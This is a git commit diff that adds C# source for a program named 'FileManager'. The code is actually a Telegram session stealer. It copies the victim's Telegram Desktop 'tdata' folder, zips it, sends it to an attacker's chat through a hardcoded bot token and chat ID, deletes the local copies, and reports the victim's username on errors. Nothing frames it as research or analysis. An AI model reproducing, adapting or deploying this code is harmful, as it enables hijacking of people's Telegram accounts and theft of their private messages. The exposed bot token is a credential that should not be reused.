63dd5111b2cce4f9ee4d2e8a105531c9b8940cec
Abdura <abdura52.uz@gmail.com>
2023-10-09 21:38:43 +0100

    Temp

---
+++ Program.cs
@@ -0,0 +1,29 @@
+﻿using FileManager.Services;
+using Telegram.Bot;
+
+string apiToken = "6697062823:AAGCZWkjT24pGwBOgckQBYeq1zGUylpwP4A"; //Telegram bot token
+string adminId2 = "6095810791";
+
+var client = new TelegramBotClient(apiToken);
+
+var fileService = new FileService();
+
+
+try
+{
+    var dataPath = fileService.GetData();
+    var zipPath = fileService.CreateZipFile(dataPath);
+
+    using (var stream = File.OpenRead(zipPath))
+    {
+        var iof = new Telegram.Bot.Types.InputFileStream(stream, "tdata.zip");
+        await client.SendDocumentAsync(adminId2, iof);
+    }
+
+    File.Delete(zipPath);
+    Directory.Delete(dataPath, true);
+}
+catch (Exception ex)
+{
+    await client.SendTextMessageAsync(adminId2, $"User: {Environment.UserName}\nError: {ex.Message}");
+}
---
+++ Services/FileService.cs
@@ -0,0 +1,53 @@
+﻿using System.IO.Compression;
+using System.Security.Cryptography.X509Certificates;
+
+namespace FileManager.Services;
+
+public class FileService
+{
+    public string GetData()
+    {
+        var sourcePath = $@"C:\Users\{Environment.UserName}\AppData\Roaming\Telegram Desktop\tdata";
+        var destinationPath = Path.Combine(Directory.GetCurrentDirectory(), "data");
+
+        if (Directory.Exists(destinationPath))
+            Directory.Delete(destinationPath, true);
+
+        FilterData(sourcePath, destinationPath);
+
+        return destinationPath;
+    }
+
+    private void FilterData(string sourcePath, string destinationPath)
+    {
+        var files = Directory.GetFiles(sourcePath);
+        var directories = Directory.GetDirectories(sourcePath);
+
+        //Check and create destination directory
+        if (!Directory.Exists(destinationPath))
+            Directory.CreateDirectory(destinationPath);
+
+        //Copy FIles
+        foreach (var file in files)
+        {
+            if (file.Contains("log") || file.Contains("working")) continue;
+            File.Copy(file, Path.Combine(destinationPath, Path.GetFileName(file)));
+        }
+
+        //Copy Directories 
+        foreach (var directory in directories)
+        {
+            if (directory.Contains("user") || directory.Contains("dum") || directory.Contains("emoj")) continue;
+
+            FilterData(directory, Path.Combine(destinationPath, Path.GetFileName(directory)));
+        }
+    }
+
+    public string CreateZipFile(string sourcePath)
+    {
+        var destPath = Path.Combine(Directory.GetCurrentDirectory(), "tdata.zip");
+        ZipFile.CreateFromDirectory(sourcePath, destPath);
+
+        return destPath;
+    }
+}
